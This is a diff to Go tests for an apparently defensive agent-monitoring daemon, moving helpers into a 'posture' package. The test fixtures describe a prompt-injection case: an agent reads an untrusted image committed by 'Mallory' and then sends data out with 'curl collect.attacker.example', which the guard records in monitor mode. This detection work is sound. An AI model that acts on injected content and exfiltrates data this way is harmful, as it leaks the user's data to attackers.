@@ -13,6 +13,7 @@ import (
 	"github.com/cavi-ai/secure-agent/daemon/internal/event"
 	"github.com/cavi-ai/secure-agent/daemon/internal/guard"
 	"github.com/cavi-ai/secure-agent/daemon/internal/model"
+	"github.com/cavi-ai/secure-agent/daemon/internal/posture"
 )
 
 const untrustedImageOrigin = "committed by Mallory <mallory@attacker.example> in repo@c405510 on 2026-10-28 (docs: add build spec diagram)"
@@ -69,12 +70,12 @@ func TestSessionMemoryShowsUntrustedInputAndSend(t *testing.T) {
 // The finding states what was read, what it was sent through and what the
 // guard did, and its assessment names the control outcome.
 func TestUntrustedEgressFindingReadsPlainly(t *testing.T) {
-	if got := humanFlagTitle("untrusted-egress"); got != "Data sent after reading untrusted content" {
+	if got := posture.HumanFlagTitle("untrusted-egress"); got != "Data sent after reading untrusted content" {
 		t.Fatalf("title = %q", got)
 	}
 	f := untrustedEgressFlag(time.Now(), "monitored")
 	what := explainWhat(f, &model.FlagExplain{}, nil)
-	want := familyTitle("claude") + " read an image (build-spec.png) and 1 more untrusted input, then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
+	want := posture.FamilyTitle("claude") + " read an image (build-spec.png) and 1 more untrusted input, then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
 	if what != want {
 		t.Fatalf("what = %q\nwant %q", what, want)
 	}
@@ -107,7 +108,7 @@ func TestUntrustedEgressFindingNamesEachInputKind(t *testing.T) {
 			{Kind: "untrusted-input", Label: tc.label, Rule: tc.kind},
 			{Kind: "send", Label: "curl collect.attacker.example", Sub: "ran; monitor mode records it", Rule: "monitored"},
 		}}
-		want := familyTitle("claude") + " read " + tc.want + ", then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
+		want := posture.FamilyTitle("claude") + " read " + tc.want + ", then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
 		if got := explainWhat(f, &model.FlagExplain{}, nil); got != want {
 			t.Fatalf("%s: what = %q\nwant %q", tc.kind, got, want)
 		}
